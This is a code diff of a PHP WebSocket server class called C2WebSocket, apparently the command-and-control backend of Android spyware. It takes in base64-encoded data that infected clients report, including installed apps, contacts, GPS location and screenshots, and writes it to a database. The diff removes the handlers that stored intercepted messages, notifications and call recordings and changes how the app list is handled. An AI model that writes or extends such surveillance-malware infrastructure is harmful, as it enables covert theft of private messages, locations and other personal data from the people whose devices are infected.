@@ -49,9 +49,9 @@ class C2WebSocket implements MessageComponentInterface {
                 "message" => "[" .$currentDateTime . "]: Connection established successfully " . $conn->resourceId
             ];
             $conn->send(json_encode($response));
-        } elseif ($data->type === 'client')
+        } elseif ($data->type === 'client') {
             $this->clientConnection($conn, $data);
-        elseif ($data->type === 'server')
+        } elseif ($data->type === 'server')
             $this->serverConnection($conn, $data);
 
         if (isset($data->res) && $data->res === 'id')
@@ -93,15 +93,15 @@ class C2WebSocket implements MessageComponentInterface {
      */
     private function clientConnection(ConnectionInterface $conn, $data): void
     {
-        $clientID = $data->id;
-        $this->updateClientWebSocketIDinDatabase($clientID, $conn->resourceId);
+        $clientID = intval($data->id);
 
         switch ($data->res) {
             case "app_list":
                 $apps = json_decode(base64_decode($data->data));
                 foreach ($apps as $packageName => $appName) {
-                    $query = "INSERT INTO INSTALLED_APP(client_id, package_name, app_name, timestamp) VALUES(?, ?, ?, ?)";
-                    $this->database->insert($query, [$clientID, $packageName, $appName, $data->timestamp]);
+                    echo "$packageName $appName\n";
+                    // $query = "INSERT INTO INSTALLED_APP(client_id, package_name, app_name, timestamp) VALUES(?, ?, ?, ?)";
+                    // $this->database->insert($query, [$clientID, $packageName, $appName, $data->timestamp]);
                 }
                 break;
             case "contact":
@@ -126,27 +126,6 @@ class C2WebSocket implements MessageComponentInterface {
                 $altitude = floatval(base64_decode($data->altitude));
                 $timestamp = $data->timestamp;
                 $this->database->insert($query, [$clientID, $latitude, $longitude, $altitude, $timestamp]);
-                break;
-            case "message":
-                $query = "INSERT INTO MESSAGE(client_id, sender, content, timestamp) VALUES(?, ?, ?, ?)";
-                $sender = base64_decode($data->sender);
-                $content = base64_decode($data->content);
-                $timestamp = $data->timestamp;
-                $this->database->insert($query, [$clientID, $sender, $content, $timestamp]);
-                break;
-            case "notification":
-                $query = "INSERT INTO NOTIFICATION(client_id, sender, content, timestamp) VALUES(?, ?, ?, ?)";
-                $sender = base64_decode($data->sender);
-                $content = base64_decode($data->content);
-                $timestamp = $data->timestamp;
-                $this->database->insert($query, [$clientID, $sender, $content, $timestamp]);
-                break;
-            case "recording":
-                $query = "INSERT INTO RECORDING(client_id, filename, timestamp, number) VALUES(?, ?, ?, ?)";
-                $filename = base64_decode($data->filename);
-                $number = base64_decode($data->number);
-                $timestamp = $data->timestamp;
-                $this->database->insert($query, [$clientID, $filename, $timestamp, $number]);
                 break;
             case "screenshot":
                 $query = "INSERT INTO SCREENSHOT(client_id, filename, timestamp) VALUES(?, ?, ?)";
